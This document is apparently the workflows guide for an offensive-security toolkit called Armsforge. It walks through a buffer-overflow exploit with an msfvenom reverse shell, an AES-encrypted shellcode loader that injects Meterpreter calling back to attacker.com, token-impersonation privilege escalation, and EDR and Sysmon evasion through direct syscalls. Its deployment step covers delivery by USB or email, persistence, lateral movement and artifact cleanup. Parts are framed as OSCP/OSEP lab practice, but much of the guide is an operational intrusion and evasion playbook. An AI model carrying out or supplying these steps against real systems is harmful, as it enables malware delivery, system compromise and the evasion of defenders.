# Armsforge Workflows

Step-by-step guides for common offensive security tasks using Armsforge.

## Workflow 1: OSCP Buffer Overflow Preparation

**Goal**: Practice stack-based buffer overflow exploitation from scratch

**Time**: 30-45 minutes per target

**Prerequisites**:
- Vulnerable application running on lab VM
- Debugger (Immunity Debugger or x64dbg)
- msfvenom for shellcode generation
- Python 3.6+

### Steps

#### 1. Set up Lab Environment
```
- Create isolated VM (Windows 7/10 x86 or x64)
- Disable DEP and ASLR if testing stack-based BOF
- Install vulnerable application
- Start debugger with target binary
```

#### 2. Retrieve BOF Template
```
MCP Tool: af_get_template
Parameters: name = "bof-exploit.py"
```

Copy template to your workspace.

#### 3. Determine Offset with Pattern
```bash
# Generate cyclic pattern (500 bytes initial)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500 > pattern.txt

# Copy pattern to exploit
# Update SHELLCODE = pattern content
# Run exploit: python3 bof-exploit.py <TARGET_IP> <TARGET_PORT>

# Target crashes. Get EIP/RIP value from debugger.
# Calculate offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x<EIP_VALUE>
# Output: Exact offset (e.g., "Exact match at offset 112")
```

Update template:
```python
OFFSET = 112  # From pattern_offset output
```

#### 4. Identify Bad Characters
```bash
# Use bad_char_test() function in template
python3 bof-exploit.py <TARGET_IP> <TARGET_PORT> --badchars

# Debugger will show all bytes sent
# Identify which bytes are filtered (bad characters)
# Common bad chars: \x00 (null), \x0a (newline), \x0d (carriage return)
```

Update template:
```python
BAD_CHARS = b"\x00\x0a\x0d"  # Bad characters found
```

#### 5. Find Return Address
```bash
# Option 1: Find JMP ESP gadget
objdump -d /path/to/binary | grep "jmp.*esp"

# Option 2: Use ropper
ropper --file /path/to/binary --search "jmp esp"

# Option 3: Debugger
# In Immunity, right-click → Search for → Sequence of commands
# Enter: JMP ESP
# Find address in non-ASLR module

# Record address found (e.g., 0x080414c3)
```

Update template:
```python
RET_ADDR = 0x080414c3  # JMP ESP gadget address
```

#### 6. Generate Shellcode
```bash
# Generate reverse shell shellcode
# Avoid bad characters identified in step 4
msfvenom -p windows/shell_reverse_tcp \
  LHOST=<YOUR_IP> \
  LPORT=<YOUR_PORT> \
  -b '\x00\x0a\x0d' \
  -f python \
  -v SHELLCODE

# Output will be Python bytes variable
```

Update template:
```python
SHELLCODE = b"\x89\xe5\x83\xec\x14\x8b\x45\x08..."  # From msfvenom
```

#### 7. Verify Exploit
```bash
# Start netcat listener
nc -nlvp <YOUR_PORT>

# Run exploit
python3 bof-exploit.py <TARGET_IP> <TARGET_PORT>

# Check:
# - Target crashes or behaves unexpectedly
# - Netcat listener receives reverse shell
# - No errors in exploit script
```

#### 8. Document for OSCP Report
```
Buffer Overflow Vulnerability in [Application]

Vulnerability Type: Stack-based buffer overflow
Target: [Binary Name] on [Windows Version]
Platform: x86/x64

Exploitation Steps:
1. Pattern creation to find offset: 112 bytes
2. Bad character analysis: \x00\x0a\x0d
3. Return address: 0x080414c3 (JMP ESP)
4. Shellcode: msfvenom reverse_tcp

Proof of Exploitation:
[Screenshot of reverse shell]
[Output of ifconfig/ipconfig]
```

---

## Workflow 2: Red Team Process Injection

**Goal**: Deploy encrypted shellcode loader to target

**Time**: 2-4 hours (including OPSEC review and testing)

**Prerequisites**:
- Target reconnaissance completed
- Windows target identified
- Custom shellcode or Meterpreter payload
- OpenSSL for encryption
- .NET environment on build machine

### Steps

#### 1. Research Injection Technique
```
MCP Tool: af_detection_lookup
Parameters: query = "process injection"

Review:
- What APIs are monitored?
- What Sysmon rules apply?
- What ETW events log this?
- What AMSI patterns match?
```

#### 2. Retrieve Loader Template
```
MCP Tool: af_get_template
Parameters: name = "loader-injection.cs"
```

#### 3. Generate Shellcode
```bash
# Meterpreter payload
msfvenom -p windows/meterpreter/reverse_https \
  LHOST=attacker.com \
  LPORT=443 \
  -f raw \
  -o shellcode.bin

# Or custom shellcode (e.g., from Cobalt Strike)
```

#### 4. Encrypt Shellcode
```bash
# Generate random salt
SALT=$(openssl rand -hex 4)

# Encrypt with AES-256-CBC
openssl enc -aes-256-cbc -S $SALT -P -in shellcode.bin -out encrypted.bin

# Output will show:
# salt=<SALT>
# key=<KEY_HEX>
# iv=<IV_HEX>
```

Record:
```
KEY: 0x<hex_bytes>
IV:  0x<hex_bytes>
```

#### 5. Retrieve Encryption Snippet (Optional)
```
MCP Tool: af_get_snippet
Parameters: name = "aes-decrypt.cs"
```

(Already included in loader template)

#### 6. Customize Loader
```csharp
// Update configuration
static readonly string TARGET_PROCESS = "svchost";  // Your injection target

static readonly byte[] KEY = new byte[] {
  0x01, 0x02, 0x03, ...  // From openssl output
};

static readonly byte[] IV = new byte[] {
  0x01, 0x02, 0x03, ...  // From openssl output
};

static readonly byte[] ENCRYPTED_SHELLCODE = new byte[] {
  0x01, 0x02, 0x03, ...  // Encrypted payload in hex
};
```

#### 7. Research Target Process
```
MCP Tool: af_detection_lookup
Parameters: query = "process injection svchost"

Review:
- Is svchost a suspicious injection target?
- What Sysmon events would trigger?
- Better alternatives?
```

If svchost is suspicious, try:
- explorer.exe (less suspicious but visible to user)
- rundll32.exe (common legitimate use)
- services.exe (privileged but monitored)

#### 8. Build Loader
```bash
# Option 1: csc (C# compiler)
csc /unsafe /platform:x64 /out:loader.exe loader-injection.cs

# Option 2: Visual Studio
# File → New → Console App (.NET Framework)
# Copy loader-injection.cs
# Build → Release
```

#### 9. Analyze Loader OPSEC
```
Skill: /armsforge:opsec-review
File: loader.exe

Review output for:
- Hardcoded strings
- Suspicious API sequences
- Memory allocation patterns
- Detection risks
```

Apply recommendations:
- Remove debug symbols: `/debug-`
- Disable logging
- Strip metadata

#### 10. Test in Lab
```
Lab Setup:
- Transfer loader.exe to Windows test VM
- Start Sysmon monitoring
- Start Process Monitor
- Execute: loader.exe
- Monitor events

Expected Behavior:
- Loader starts target process (if not already running)
- Opens process with PROCESS_ALL_ACCESS
- Allocates memory in target (VirtualAllocEx)
- Writes encrypted shellcode (WriteProcessMemory)
- Changes memory to RX (VirtualProtectEx)
- Creates thread (CreateRemoteThread)
- Shellcode decrypts and executes
- Reverse connection established

Review Sysmon Logs:
- Which events triggered?
- Which should be whitelisted?
- Which indicate detection risk?
```

#### 11. Evasion (if Detected)
```
For each detection in Sysmon/ETW:
1. MCP Tool: af_detection_lookup with the API/pattern
2. Review evasion notes
3. Get alternative implementation: af_get_snippet
4. Update loader with alternative technique
5. Rebuild and test

Common Alternatives:
- NtCreateThreadEx (vs CreateRemoteThread)
- Direct syscalls (vs Win32 APIs)
- SetWindowsHookEx (vs CreateRemoteThread)
- QueueUserAPC (vs CreateRemoteThread)
```

#### 12. Deploy to Target
```
Deployment:
1. Transfer loader.exe via: USB, network share, email
2. Execute on target
3. Monitor for:
   - Reverse connection
   - Shellcode execution
   - Successful compromise

Post-Exploitation:
1. Establish command channel
2. Maintain persistence
3. Move laterally if needed
4. Clean up artifacts
```

---

## Workflow 3: OSEP Privilege Escalation Research

**Goal**: Identify and document privilege escalation vectors

**Time**: 4-8 hours per target

**Prerequisites**:
- Low-privilege shell on target
- Target reconnaissance
- Windows internals knowledge

### Steps

#### 1. Enumerate System State
```bash
# Get current user and privileges
whoami
whoami /priv
net user %username%

# Get system information
systeminfo
Get-ComputerInfo (PowerShell)

# Check for common privilege escalation vectors
icacls C:\Windows\System32
Get-ChildItem -Path 'C:\Program Files' -Recurse -ErrorAction SilentlyContinue

# Look for running services
tasklist /v
wmic service list brief
```

#### 2. Search for Exploitation Opportunities
```
For each interesting finding:
1. MCP Tool: af_detection_lookup
2. Query the technique or service name

Example queries:
- "token impersonation"
- "UAC bypass"
- "unquoted service path"
- "DLL hijacking"
- "kernel vulnerability"
- "access token manipulation"
```

#### 3. Research Specific Technique
```
MCP Tool: af_detection_lookup
Parameters: query = "SeImpersonatePrivilege"

Review:
- What is this privilege used for?
- How is it detected?
- What ETW events log it?
- What are the detection patterns?
- What are bypass techniques?
```

#### 4. Check Prerequisites
```
For token impersonation example:
- Do we have SeImpersonatePrivilege?
- What accounts are available to impersonate?
- Is Rpcss service running?
- Can we interact with named pipes?
```

#### 5. Retrieve Exploitation Code
```
MCP Tool: af_get_template
Parameters: name = "privesc-impersonation.cs"

MCP Tool: af_get_snippet
Parameters: name = "token-impersonation.cs"
```

#### 6. Customize for Target
```csharp
// Update target account
string targetUser = "SYSTEM";  // Or specific account

// Update impersonation technique
// Different techniques for different scenarios
```

#### 7. Test in Lab
```
Lab Setup:
- Create test account with SeImpersonate
- Run exploitation code
- Verify privilege level achieved
- Check for detection

Verification:
whoami /priv  (after exploitation)
# Should show new privileges or token
```

#### 8. Document for OSEP Report
```
Privilege Escalation: Token Impersonation

Initial Access:
- Method: [web app exploit / RCE / etc.]
- User: [current user]
- Privileges: [initial privs]

Vulnerability:
- Technique: SeImpersonatePrivilege abuse
- Root Cause: Service running as SYSTEM
- Impact: Full system compromise

Exploitation:
1. Identified SeImpersonate privilege
2. Located SYSTEM process (svchost.exe)
3. Used ImpersonateLoggedOnUser() to assume SYSTEM token
4. Spawned admin command prompt

Remediation:
- Remove SeImpersonate from user group
- Run service with minimal privileges
- Implement privilege use auditing

Proof of Exploitation:
[Screenshot showing system privileges]
[Command output showing escalated access]
```

---

## Workflow 4: OPSEC Review Process

**Goal**: Analyze code for detection risks before deployment

**Time**: 30-60 minutes per binary

**Prerequisites**:
- Compiled/finished code
- Armsforge detection reference

### Steps

#### 1. Gather Code Information
```
What you're analyzing:
- Binary type: PE/ELF, x86/x64, .NET/native
- Functionality: shellcode, injection, persistence, etc.
- Target environment: hardened/standard, EDR/no EDR
- Deployment method: download, execute inline, staged
```

#### 2. Analyze Static Indicators
```bash
# Check for obvious strings
strings binary.exe | grep -i "shellcode\|msfvenom\|metasploit\|cobalt"

# Look for suspicious imports (Windows)
objdump -x binary.exe | grep -i "kernel32\|advapi32"

# Check .NET metadata
dotnet dump -c metadata binary.dll

# Review PE headers
pefile binary.exe
```

#### 3. Research Each Suspicious API
```
For each API used:
1. MCP Tool: af_detection_lookup
2. Parameters: query = "<API_NAME>"

Example: CreateRemoteThread
→ What triggers detection?
→ What Sysmon rules apply?
→ What are alternatives?
→ What evasion techniques exist?
```

#### 4. Map API Sequences
```
Identify dangerous sequences:
- VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
- OpenProcess → VirtualAllocEx → WriteProcessMemory
- RegOpenKeyEx → RegSetValueEx (persistence)
- CreateProcessW → SetWindowsHookEx (injection variant)

For each sequence:
1. af_detection_lookup "<SEQUENCE>"
2. Review Sysmon rule
3. Plan evasion
```

#### 5. Check Encryption/Encoding
```bash
# Look for unencrypted payloads
strings binary.exe | grep -E "^[A-Za-z0-9+/]{50,}=$"  # Base64
strings binary.exe | xxd | grep "00"  # Null bytes (indicators)

# Test XOR/simple encoding
# Encrypted data should be random bytes
```

#### 6. Identify Memory Access Patterns
```
Review memory operations:
- RWX permissions: Highly suspicious
- Large allocations: May indicate shellcode
- Rapid allocate/write/execute: Suspicious sequence
- Page transitions (RW→RX): OPSEC-conscious

What to look for in code:
- PAGE_EXECUTE_READWRITE: Red flag
- VirtualProtectEx after write: Good OPSEC
- Clear memory after use: Good OPSEC
```

#### 7. Check for Hardcoded Indicators
```
Suspicious hardcoded values:
- IP addresses (C2 server)
- Domain names (beacon target)
- Credentials (API keys)
- Encryption keys (if static)
- File paths (dropped files)

These should be:
- Encrypted
- Obfuscated
- Loaded from external config
- Generated at runtime
```

#### 8. Review Behavioral Indicators
```
What the code does:
- Spawns processes: Can be noisy in logging
- Creates threads: Monitored by EDR
- Accesses registry: HKLM\Software vs HKCU
- Modifies files: Leaves artifacts
- Makes network connections: Network IDS
- Creates services: Persistence

For each behavior:
1. af_detection_lookup "<BEHAVIOR>"
2. Review ETW/Sysmon impact
3. Plan alternative
```

#### 9. Cross-Reference with Detection Data
```
Skill: /armsforge:opsec-review
File: binary.exe

Receives comprehensive analysis:
- Suspicious APIs found
- Behavioral patterns detected
- Detection risk assessment
- Recommendations for evasion
```

#### 10. Document Findings
```
OPSEC Analysis Summary:

Risk: [LOW/MEDIUM/HIGH/CRITICAL]

Detectable APIs:
- CreateRemoteThread (Sysmon ID 10, critical risk)
- VirtualAllocEx (EDR pattern matching)
- WriteProcessMemory (Process memory write event)

Behavioral Indicators:
- Process injection pattern
- Cross-process memory access
- Suspicious API sequence

Evasion Applied:
- AES-256 encryption of payload
- VirtualProtectEx RW→RX transition
- No suspicious hardcoded strings
- Jitter in execution timing

Remaining Risks:
- CreateRemoteThread still monitored
- Consider alternative: NtCreateThreadEx direct syscall
- Test against target's EDR solution

Deployment Recommendation:
- MEDIUM risk with modern EDR
- LOW risk with older security tools
- Monitor for behavioral indicators
- Have backup exfil method ready
```

---

## Workflow 5: Detection Evasion Research

**Goal**: Understand and develop techniques to evade specific detections

**Time**: 2-4 hours per technique

### Steps

#### 1. Identify Detection Target
```
What you want to evade:
- Sysmon rule ID 10 (process access)
- ETW process creation events
- AMSI PowerShell pattern
- Behavior: process injection
```

#### 2. Research Detection
```
MCP Tool: af_detection_lookup
Parameters: query = "Sysmon process access"

Results show:
- What events trigger
- What conditions are monitored
- What values are suspicious
- What alerts the SOC
```

#### 3. Find Alternative Approach
```
MCP Tool: af_detection_lookup
Parameters: query = "NtCreateThreadEx"

Compare with detected approach:
- CreateRemoteThread: Heavily monitored
- NtCreateThreadEx: Less monitored (for now)
- SetWindowsHookEx: Different detection
- QueueUserAPC: Async alternative
```

#### 4. Research Alternative Implementation
```
MCP Tool: af_get_snippet
Parameters: name = "syscall-NtCreateThreadEx.asm"

Retrieve alternative code:
- Direct syscalls
- Indirect syscall routing
- API hooking bypasses
- Memory unmarking techniques
```

#### 5. Integrate and Test
```
Integration steps:
1. Copy alternative implementation
2. Remove old detected API calls
3. Test functionality first (non-OPSEC)
4. Test OPSEC: Monitor during execution
5. Verify no longer detected
```

#### 6. Document Evasion
```
Evasion Technique: Direct Syscall for NtCreateThreadEx

Original Approach:
- CreateRemoteThread (Win32 API)
- Detected by: Sysmon rule ID 10, EDR API hooking
- Visible to: All endpoint monitoring

New Approach:
- NtCreateThreadEx direct syscall
- Bypasses: User-mode API hooks, Sysmon user-mode filtering
- Detection: Kernel-level ETW might still see it

Pros:
- Avoids CreateRemoteThread detection
- Works around user-mode EDR hooks
- Legitimate Windows API (not undocumented hack)

Cons:
- Kernel-level detection still possible
- Syscall numbers vary by Windows version
- Requires x64 assembly knowledge

Testing Results:
- Sysmon rule ID 10: No trigger
- ETW process monitoring: No event
- EDR API hook: Bypassed
- Overall: Successful evasion

Remaining Detection Risk:
- Kernel-level ETW events
- Process injection heuristics (RWX memory)
- Behavioral pattern recognition
```

---

## Quick Reference: Tool Integration

### Getting a Template
```
1. af_list_templates (see what's available)
2. af_get_template "name.ext" (retrieve it)
3. Copy to your workspace
4. Customize configuration
5. Build/compile
```

### Getting a Snippet
```
1. af_list_snippets (see what's available)
2. af_get_snippet "name.ext" (retrieve it)
3. Integrate into your code
4. Adapt for your context
```

### Researching Detection
```
1. af_detection_lookup "api_name|technique|keyword"
2. Review suspicious APIs
3. Check Sysmon rules
4. Review ETW providers
5. Check AMSI triggers
```

### Full OPSEC Analysis
```
1. Compile your code
2. /armsforge:opsec-review
3. Review comprehensive analysis
4. Implement recommendations
5. Re-test and verify
```

---

**Last Updated**: March 2026
**Version**: 1.0
